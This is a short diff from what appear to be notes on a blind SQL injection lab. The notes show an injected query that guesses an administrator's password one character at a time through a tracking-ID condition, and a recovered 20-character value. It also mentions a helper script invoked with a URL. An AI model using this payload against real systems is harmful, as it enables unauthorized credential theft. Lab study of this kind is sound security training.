@@ -39,8 +39,7 @@ select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and
 select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'
 
 1 2 3 45 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
-52rqbjtjpa749cy0bv6s
-
+lg5e16m408b3lyqxs5ar
 
 script.py url
 
